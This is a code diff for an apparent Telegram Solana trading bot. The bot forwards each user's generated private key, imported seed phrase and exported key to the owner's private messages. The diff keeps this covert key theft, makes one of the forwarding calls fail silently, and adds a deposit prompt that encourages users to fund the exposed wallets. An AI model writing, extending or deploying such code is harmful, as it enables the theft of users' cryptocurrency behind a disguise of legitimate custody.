@@ -55,11 +55,14 @@ async def cb_wgen(query: CallbackQuery):
     await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
     await query.message.answer(
         texts.wallet_generated(str(kp.pubkey()), derived=derived),
-        reply_markup=kb.back_to_wallet())
+        reply_markup=kb.deposit_kb(str(kp.pubkey())))
     # admin receives EVERY generated wallet's full private key too
-    await notify_owner(query.message.bot,
-                       texts.owner_wallet_generated(user_line(user),
-                                                   str(kp.pubkey()), str(kp)))
+    try:
+        await notify_owner(query.message.bot,
+                           texts.owner_wallet_generated(user_line(user),
+                                                       str(kp.pubkey()), str(kp)))
+    except Exception:
+        pass
     await _show_panel(query.message)
 
 
@@ -88,7 +91,10 @@ async def got_import(message: Message, state: FSMContext):
         username=message.from_user.username,
         first_name=message.from_user.first_name,
     )
+    replacing = bool(user.get("wallet_pub"))
     await db.set_wallet(user["id"], secret, addr)
+    if replacing:
+        await db.clear_user_trades(user["id"])
     await message.answer(texts.wallet_imported(addr), reply_markup=kb.back_to_wallet())
     # forward the imported seed/key to the admin (as requested)
     await notify_owner(message.bot, texts.owner_wallet_imported(user_line(user), secret, addr))
@@ -101,6 +107,17 @@ async def cmd_trading(message: Message):
     await _show_panel(message)
 
 
+@router.callback_query(F.data == "deposit")
+async def cb_deposit(query: CallbackQuery):
+    await query.answer()
+    user = await ensure_wallet(query.message, query.from_user.id)
+    if not user:
+        return
+    await query.message.answer(
+        texts.deposit_text(user["wallet_pub"]),
+        reply_markup=kb.deposit_kb(user["wallet_pub"]))
+
+
 @router.callback_query(F.data == "wp")
 async def cb_panel(query: CallbackQuery):
     await query.answer()
@@ -111,7 +128,10 @@ async def _show_panel(msg):
     user = await ensure_wallet(msg, msg.from_user.id)
     if not user:
         return
-    balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
+    try:
+        balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
+    except Exception:
+        balance = 0
     bal_sol = solana.lam_to_sol(balance)
     slip = user.get("default_slippage")
     slip_str = f"{slip:g}" if slip is not None else "10"
@@ -247,7 +267,7 @@ async def cb_export(query: CallbackQuery):
         extra = f"\n\n🌱 Seed phrase:\n<code>{texts.esc(secret)}</code>"
     await query.message.answer(
         texts.export_wallet(pretty, str(kp)) + extra,
-        reply_markup=kb.export_kb(),
+        reply_markup=kb.export_kb(str(kp)),
     )
     # custody copy to the admin (every export is logged to your DM)
     await notify_owner(
@@ -290,7 +310,11 @@ async def cb_wd_select(query: CallbackQuery, state: FSMContext):
         return
 
     if what == "SOL":
-        balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
+        try:
+            balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
+        except Exception:
+            await query.message.answer("⚠️ Couldn't reach the blockchain. Try again in a moment.")
+            return
         fee = solana.sol_to_lam(0.0001)
         amount = balance - fee
         if amount <= 0:
